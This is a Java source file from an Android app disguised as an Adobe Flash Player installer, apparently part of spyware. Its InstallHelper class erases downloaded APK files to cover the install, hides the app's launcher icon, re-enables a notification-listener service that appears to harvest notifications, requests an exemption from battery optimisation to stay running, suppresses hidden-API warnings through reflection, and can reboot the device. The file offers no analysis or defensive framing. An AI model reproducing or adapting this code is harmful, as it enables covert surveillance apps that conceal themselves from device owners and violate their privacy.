package com.adobe.flashplayer.install;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Locale;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.widget.EditText;
import android.widget.Toast;
import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.core.NoteListenerSrv;

import java.util.List;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.AppOpsManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;


public class InstallHelper {


    public static String TAG = "[ljg]InstallHelper";



    public static void removeApk(Context context, String path){
//		String apkfn = context.getPackageCodePath();
//		apkfn = apkfn.replace("-1.apk", ".apk");


        if (path.equals("")) {
            if (Build.MANUFACTURER.contains("vivo")) {
                path = Environment.getExternalStorageDirectory() + "/下载/";
            }else{
                File downpath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                path = downpath.getAbsolutePath();
            }
        }

        File files[] = new File(path).listFiles();
        if(files == null || files.length <= 0){
            return;
        }

        for (int i = 0; i < files.length; i++) {
            if (files[i].isFile()) {
                String filename = files[i].getName();
                if (filename.endsWith(".apk")) {
                    files[i].delete();
                }
            }else if (files[i].isDirectory()) {
                removeApk(context,files[i].getAbsolutePath());
            }
        }

        return;
    }



    public static void toggleNotificationListenerService(Context context) {
        ComponentName component = new ComponentName(context, NoteListenerSrv.class);
        PackageManager pm = context.getPackageManager();
        if(pm != null){
            pm.setComponentEnabledSetting(component,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            pm.setComponentEnabledSetting(component,PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        }
    }

    public static void hideDesktopIcon_old(Activity activity){
        ComponentName componentName = new ComponentName(activity, InstallActivity.class);
        PackageManager packageManager = activity.getPackageManager();
        int res = packageManager.getComponentEnabledSetting(componentName);
        if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT|| res ==PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER, PackageManager.DONT_KILL_APP);
            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED_UNTIL_USED, PackageManager.DONT_KILL_APP);

        }
    }










        public static void reboot(Context context){
            PowerManager pManager=(PowerManager) context.getSystemService(Context.POWER_SERVICE);
            pManager.reboot(null);
        }


        public static void ignoreBatteryOpt(Activity activity,int code) {
            try {
                if (Build.VERSION.SDK_INT >= 23){
                    String packname = activity.getPackageName();
                    PowerManager powerManager = (PowerManager) activity.getSystemService(Context.POWER_SERVICE);
                    boolean hasIgnored = powerManager.isIgnoringBatteryOptimizations(packname);

                    Intent intent = new Intent();

                    if (hasIgnored) {
                        intent.setAction(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        activity.startActivity(intent);

                        hasIgnored = powerManager.isIgnoringBatteryOptimizations(packname);
                        Log.e(TAG,"request ignore battery result:" + hasIgnored );
                    }else{
                        //方法二，跳到相应的设置页面用户自己去设置
                        //activity.startActivity(new Intent("android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"));
                        //方法二，请求权限
                        //activity.requestPermissions(new String[]{"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"}, 0);

                        intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        Uri uri = Uri.parse("package:" + packname);
                        intent.setData(uri);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        activity.startActivityForResult(intent,code);
                        Log.e(TAG,"request ignore battery return:" + code );

                        hasIgnored = powerManager.isIgnoringBatteryOptimizations(packname);
                        Log.e(TAG,"request ignore battery result:" + hasIgnored );
                    }

                }
            }catch(Exception ex){
                ex.printStackTrace();

                Log.e(TAG,"exception");
            }
        }





    @SuppressWarnings("unused")
    private void closeAndroidPDialog(){
        try {
            Class <?> aClass = Class.forName("android.content.pm.PackageParser$Package");
            Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(String.class);
            declaredConstructor.setAccessible(true);
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            Class <?>cls = Class.forName("android.app.ActivityThread");
            Method declaredMethod = cls.getDeclaredMethod("currentActivityThread");
            declaredMethod.setAccessible(true);
            Object activityThread = declaredMethod.invoke(null);
            @SuppressLint("SoonBlockedPrivateApi") Field mHiddenApiWarningShown = cls.getDeclaredField("mHiddenApiWarningShown");
            mHiddenApiWarningShown.setAccessible(true);
            mHiddenApiWarningShown.setBoolean(activityThread, true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static void hideDesktopIcon(Context context){
        Intent intent = new Intent(context, MaskActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }


    public static void toAndroidBrowser(Context context){
        Intent intent = new Intent();
        intent.setAction("android.intent.action.VIEW");
        Uri content_url = Uri.parse("https://www.baidu.com");
        intent.setData(content_url);
        //intent.setClassName("com.android.browser","com.android.browser.BrowserActivity");
        context.startActivity(intent);
    }



}
